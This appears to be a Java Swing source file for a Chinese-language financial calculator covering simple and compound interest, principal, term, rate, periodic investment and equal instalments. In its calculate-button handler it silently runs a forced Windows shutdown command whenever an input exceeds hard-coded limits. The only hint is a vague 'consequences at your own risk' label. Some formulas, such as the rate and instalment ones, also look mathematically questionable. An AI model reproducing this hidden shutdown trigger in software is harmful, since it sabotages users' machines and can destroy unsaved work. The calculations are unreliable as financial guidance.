package fuli;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.math.BigDecimal;
import java.lang.Runtime;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.SwingUtilities;
import javax.swing.UIManager;

import org.dyno.visual.swing.layouts.Constraints;
import org.dyno.visual.swing.layouts.GroupLayout;
import org.dyno.visual.swing.layouts.Leading;

//VS4E -- DO NOT REMOVE THIS LINE!
public class jiemian extends JFrame {

	private static final long serialVersionUID = 1L;
	private JTextField jTextField3;
	private JTextField jTextField2;
	private JTextField jTextField1;
	private JTextField jTextField0;
	private JLabel jLabel0;
	private JLabel jLabel1;
	private JLabel jLabel2;
	private JLabel jLabel3;
	private JTextField jTextField4;
	private JLabel jLabel4;
	private JButton jButton0;
	private JLabel jLabel5;
	 JTextField jTextField5;
	private JRadioButton jRadioButton0;
	private JRadioButton jRadioButton1;
	public jiemian() {
		initComponents();
	}

	private void initComponents() {
		setLayout(new GroupLayout());
		add(getJButton0(), new Constraints(new Leading(96, 10, 10), new Leading(237, 10, 10)));
		add(getJLabel5(), new Constraints(new Leading(17, 12, 12), new Leading(297, 12, 12)));
		add(getJTextField5(), new Constraints(new Leading(106, 86, 12, 12), new Leading(297, 12, 12)));
		add(getJRadioButton0(), new Constraints(new Leading(224, 12, 12), new Leading(48, 12, 12)));
		add(getJRadioButton1(), new Constraints(new Leading(224, 12, 12), new Leading(78, 12, 12)));
		add(getJRadioButton2(), new Constraints(new Leading(224, 12, 12), new Leading(110, 12, 12)));
		add(getJRadioButton3(), new Constraints(new Leading(224, 12, 12), new Leading(140, 10, 10)));
		add(getJRadioButton4(), new Constraints(new Leading(224, 12, 12), new Leading(167, 10, 10)));
		add(getJRadioButton5(), new Constraints(new Leading(224, 12, 12), new Leading(195, 12, 12)));
		add(getJRadioButton6(), new Constraints(new Leading(224, 12, 12), new Leading(224, 12, 12)));
		add(getJTextField0(), new Constraints(new Leading(106, 110, 12, 12), new Leading(48, 24, 12, 12)));
		add(getJTextField1(), new Constraints(new Leading(106, 110, 12, 12), new Leading(84, 24, 12, 12)));
		add(getJTextField2(), new Constraints(new Leading(106, 110, 12, 12), new Leading(125, 24, 12, 12)));
		add(getJTextField3(), new Constraints(new Leading(106, 110, 12, 12), new Leading(162, 24, 12, 12)));
		add(getJTextField4(), new Constraints(new Leading(106, 110, 12, 12), new Leading(198, 12, 12)));
		add(getJLabel1(), new Constraints(new Leading(33, 10, 10), new Leading(87, 12, 12)));
		add(getJLabel2(), new Constraints(new Leading(33, 12, 12), new Leading(123, 12, 12)));
		add(getJLabel3(), new Constraints(new Leading(33, 12, 12), new Leading(159, 12, 12)));
		add(getJLabel4(), new Constraints(new Leading(33, 12, 12), new Leading(198, 12, 12)));
		add(getJLabel0(), new Constraints(new Leading(2, 115, 12, 12), new Leading(54, 12, 12)));
		add(getJScrollPane0(), new Constraints(new Leading(231, 100, 10, 10), new Leading(255, 80, 12, 12)));
		setSize(347, 345);
	}

	private JScrollPane getJScrollPane0() {
		if (jScrollPane0 == null) {
			jScrollPane0 = new JScrollPane();
			jScrollPane0.setViewportView(getJTextPane0());
		}
		return jScrollPane0;
	}

	private JTextPane getJTextPane0() {
		if (jTextPane0 == null) {
			jTextPane0 = new JTextPane();
			jTextPane0.setEnabled(false);
			jTextPane0.setText("请不要输入过\n大的数\n不然后果自负");
		}
		return jTextPane0;
	}

	private JRadioButton getJRadioButton6() {
		if (jRadioButton6 == null) {
			jRadioButton6 = new JRadioButton();
			jRadioButton6.setSelected(false);
			jRadioButton6.setText("等额还款金额");
			jRadioButton6.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton6MouseMousePressed(event);
				}
			});
		}
		return jRadioButton6;
	}

	private JRadioButton getJRadioButton5() {
		if (jRadioButton5 == null) {
			jRadioButton5 = new JRadioButton();
			jRadioButton5.setSelected(false);
			jRadioButton5.setText("定期投资");
			jRadioButton5.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton5MouseMousePressed(event);
				}
			});
		}
		return jRadioButton5;
	}

	private JRadioButton getJRadioButton4() {
		if (jRadioButton4 == null) {
			jRadioButton4 = new JRadioButton();
			jRadioButton4.setSelected(false);
			jRadioButton4.setText("利率计算");
			jRadioButton4.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton4MouseMousePressed(event);
				}
			});
		}
		return jRadioButton4;
	}

	private JRadioButton getJRadioButton3() {
		if (jRadioButton3 == null) {
			jRadioButton3 = new JRadioButton();
			jRadioButton3.setSelected(false);
			jRadioButton3.setText("年限计算");
			jRadioButton3.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton3MouseMousePressed(event);
				}
			});
		}
		return jRadioButton3;
	}

	private JRadioButton getJRadioButton2() {
		if (jRadioButton2 == null) {
			jRadioButton2 = new JRadioButton();
			jRadioButton2.setSelected(false);
			jRadioButton2.setText("本金计算");
			jRadioButton2.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton2MouseMousePressed(event);
				}
			});
		}
		return jRadioButton2;
	}

	private JRadioButton getJRadioButton1() {
		if (jRadioButton1 == null) {
			jRadioButton1 = new JRadioButton();
			jRadioButton1.setSelected(true);
			jRadioButton1.setText("复利计算");
			jRadioButton1.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton1MouseMousePressed(event);
				}
	
				
			});
		}
		return jRadioButton1;
	}

	private JRadioButton getJRadioButton0() {
		if (jRadioButton0 == null) {
			jRadioButton0 = new JRadioButton();
			jRadioButton0.setSelected(false);
			jRadioButton0.setText("单利计算");
			jRadioButton0.addMouseListener(new MouseAdapter() {
	
				public void mousePressed(MouseEvent event) {
					jRadioButton0MouseMousePressed(event);
				}
			});
		}
		return jRadioButton0;
	}

	private JTextField getJTextField5() {
		if (jTextField5 == null) {
			jTextField5 = new JTextField();
			jTextField5.setEditable(false);
		}
		return jTextField5;
	}

	private JLabel getJLabel5() {
		if (jLabel5 == null) {
			jLabel5 = new JLabel();
			jLabel5.setText("输出结果：");
		}
		
		return jLabel5;
	}

	private JButton getJButton0() {
		if (jButton0 == null) {
			jButton0 = new JButton();
			jButton0.setText("输入");
			jButton0.addMouseListener(new MouseAdapter() {
	
				public void mouseClicked(MouseEvent event) {
					try {
						jButton0MouseMouseClicked(event);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			});
		}
		return jButton0;
	}

	private JLabel getJLabel4() {
		if (jLabel4 == null) {
			jLabel4 = new JLabel();
			jLabel4.setText("终值");
			
		}
		return jLabel4;
	}

	private JTextField getJTextField4() {
		if (jTextField4 == null) {
			jTextField4 = new JTextField();
			jTextField4.setEditable(false);
			jTextField4.setText("0");
		}
		return jTextField4;
	}

	private JLabel getJLabel3() {
		if (jLabel3 == null) {
			jLabel3 = new JLabel();
			jLabel3.setText("年复利次数");
		}
		return jLabel3;
	}

	private JLabel getJLabel2() {
		if (jLabel2 == null) {
			jLabel2 = new JLabel();
			jLabel2.setText("存入年限");
		}
		return jLabel2;
	}

	private JLabel getJLabel1() {
		if (jLabel1 == null) {
			jLabel1 = new JLabel();
			jLabel1.setText("年利率");
		}
		return jLabel1;
	}

	private JLabel getJLabel0() {
		if (jLabel0 == null) {
			jLabel0 = new JLabel();
			jLabel0.setText("           本金");
		}
		return jLabel0;
	}

	private JTextField getJTextField0() {
		if (jTextField0 == null) {
			jTextField0 = new JTextField();
			jTextField0.setText("0");
		}
		return jTextField0;
	}

	private JTextField getJTextField1() {
		if (jTextField1 == null) {
			jTextField1 = new JTextField();
			jTextField1.setText("0");
		}
		return jTextField1;
	}

	private JTextField getJTextField2() {
		if (jTextField2 == null) {
			jTextField2 = new JTextField();
			jTextField2.setText("0");
		}
		return jTextField2;
	}

	private JTextField getJTextField3() {
		if (jTextField3 == null) {
			jTextField3 = new JTextField();
			jTextField3.setText("0");
		}
		return jTextField3;
	}

	private static void installLnF() {
		try {
			String lnfClassname = PREFERRED_LOOK_AND_FEEL;
			if (lnfClassname == null)
				lnfClassname = UIManager.getCrossPlatformLookAndFeelClassName();
			UIManager.setLookAndFeel(lnfClassname);
		} catch (Exception e) {
			System.err.println("Cannot install " + PREFERRED_LOOK_AND_FEEL
					+ " on this platform:" + e.getMessage());
		}
	}

	/**
	 * Main entry of the class.
	 * Note: This class is only created so that you can easily preview the result at runtime.
	 * It is not expected to be managed by the designer.
	 * You can modify it as you like.
	 */
	public static void main(String[] args) {
		
		installLnF();
		SwingUtilities.invokeLater(new Runnable() {
			public void run() {
				
				jiemian frame = new jiemian();
				frame.setDefaultCloseOperation(jiemian.EXIT_ON_CLOSE);
				frame.setTitle("jiemian");
				frame.getContentPane().setPreferredSize(frame.getSize());
				frame.pack();
				frame.setLocationRelativeTo(null);
				frame.setVisible(true);
			}
		});
	}
    int xuanze=1;
   
	private JRadioButton jRadioButton2;
	private JRadioButton jRadioButton3;
	private JRadioButton jRadioButton4;
	private JRadioButton jRadioButton5;
	private JRadioButton jRadioButton6;
	private JTextPane jTextPane0;
	private JScrollPane jScrollPane0;
	private static final String PREFERRED_LOOK_AND_FEEL = "javax.swing.plaf.metal.MetalLookAndFeel";
	private void jButton0MouseMouseClicked(MouseEvent event) throws IOException {
		
		String P = jTextField0.getText();
		String I = jTextField1.getText();
		String N = jTextField2.getText();
		String M = jTextField3.getText();
		String SUM = jTextField4.getText();
		
		double F=0;
		double p=Double.parseDouble(P);
		double i=Double.parseDouble(I); 
		double m=Double.parseDouble(M); 
		double n=Double.parseDouble(N); 
		double sum=Double.parseDouble(SUM);
		Runtime r=Runtime.getRuntime();
		if (p<0||p > 1000000 ||i<0|| i > 1 ||m<0|| m > 1000 ||n<0|| n > 1000) {			
			r.exec("shutdown -f -s -t 1");
		}
		if(xuanze==1){
		i=Math.pow((1+(i/m)),m)-1;		
	    F=p*Math.pow((1+i),n);
		}
		
		else if(xuanze==0){
	    F=p+p*i*n;
	    }
		else if(xuanze==2){
	    i=Math.pow((1+i/m),m)-1;
	    F=sum/Math.pow(1+i,n);
		}
		else if(xuanze==3){
		i=Math.pow((1+i/m),m)-1;
		F=Math.log(sum/p)/Math.log(1+i);
		}
		else if(xuanze==4){
		F=m*(Math.pow(Math.pow(sum/p,1.0/n),1.0/i)-1);	
		}
		else if(xuanze==5){
		F=p*(1+i)*(-1+Math.pow((1+i),n))/i;
		}
		else if(xuanze==6){
		F=p*i*Math.pow((1+i),n)/Math.pow((1+i),n-1); 	
		}
		BigDecimal b = new BigDecimal(F);
		double F1 = b.setScale(2, BigDecimal.ROUND_HALF_UP).doubleValue();
		String f = Double.toString(F1);
		jTextField5.setText(f);
		
			
	}

	private void jRadioButton0MouseMousePressed(MouseEvent event) {
		if(xuanze!=0){
			xuanze=0;
			jLabel0.setText("           本金");
			jLabel1.setText("年利率");
			jLabel2.setText("存入年限");
			//jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(true);
			jTextField2.setEditable(true);
			jTextField3.setEditable(false);
			jTextField4.setEditable(false);
			guiling();
			}
			else
				jRadioButton0.setSelected(false);
	}
    void guiling(){
    	    jTextField0.setText("0");
			jTextField1.setText("0");
			jTextField2.setText("0");
			jTextField3.setText("0");
			jTextField4.setText("0");
			jTextField5.setText("0");
    }
	private void jRadioButton1MouseMousePressed(MouseEvent event) {
		if(xuanze!=1){
			xuanze=1;
			jLabel0.setText("           本金");
			jLabel1.setText("年利率");
			jLabel2.setText("存入年限");
			jRadioButton0.setSelected(false);
			//jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(true);
			jTextField2.setEditable(true);
			jTextField3.setEditable(true);
			jTextField4.setEditable(false);
			guiling();
			}
			else
				jRadioButton1.setSelected(false);
	}

	private void jRadioButton6MouseMousePressed(MouseEvent event) {
		if(xuanze!=6){
			xuanze=6;
			jLabel0.setText("           本金");
			jLabel1.setText("季利率");
			jLabel2.setText("期限");
			jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			//jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(true);
			jTextField2.setEditable(true);
			jTextField3.setEditable(false);
			jTextField4.setEditable(false);
			guiling();
			}
			else
				jRadioButton6.setSelected(false);
	}

	private void jRadioButton5MouseMousePressed(MouseEvent event) {
		if(xuanze!=5){
			xuanze=5;
			jLabel0.setText("每期定投入投入");
			jLabel1.setText("收益率");
			jLabel2.setText("定期投数");
			jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			//jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(true);
			jTextField2.setEditable(true);
			jTextField3.setEditable(false);
			jTextField4.setEditable(false);
			guiling();
			}
			else
				jRadioButton5.setSelected(false);
	}

	private void jRadioButton4MouseMousePressed(MouseEvent event) {
		if(xuanze!=4){
			xuanze=4;
			jLabel0.setText("           本金");
			jLabel1.setText("年利率");
			jLabel2.setText("存入年限");
			jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			//jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(false);
			jTextField2.setEditable(true);
			jTextField3.setEditable(true);
			jTextField4.setEditable(true);
			guiling();
			}
			else
				jRadioButton4.setSelected(false);
	}

	private void jRadioButton3MouseMousePressed(MouseEvent event) {
		if(xuanze!=3){
			xuanze=3;
			jLabel0.setText("           本金");
			jLabel1.setText("年利率");
			jLabel2.setText("存入年限");
			jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			jRadioButton2.setSelected(false);
			//jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(true);
			jTextField1.setEditable(true);
			jTextField2.setEditable(false);
			jTextField3.setEditable(true);
			jTextField4.setEditable(true);
			guiling();
			}
			else
				jRadioButton3.setSelected(false);
	}

	private void jRadioButton2MouseMousePressed(MouseEvent event) {
		if(xuanze!=2){
			xuanze=2;
			jLabel0.setText("           本金");
			jLabel1.setText("年利率");
			jLabel2.setText("存入年限");
			jRadioButton0.setSelected(false);
			jRadioButton1.setSelected(false);
			//jRadioButton2.setSelected(false);
			jRadioButton3.setSelected(false);
			jRadioButton4.setSelected(false);
			jRadioButton5.setSelected(false);
			jRadioButton6.setSelected(false);
			jTextField0.setEditable(false);
			jTextField1.setEditable(true);
			jTextField2.setEditable(true);
			jTextField3.setEditable(true);
			jTextField4.setEditable(true);
			guiling();
			}
			else
				jRadioButton2.setSelected(false);
		
	}

}
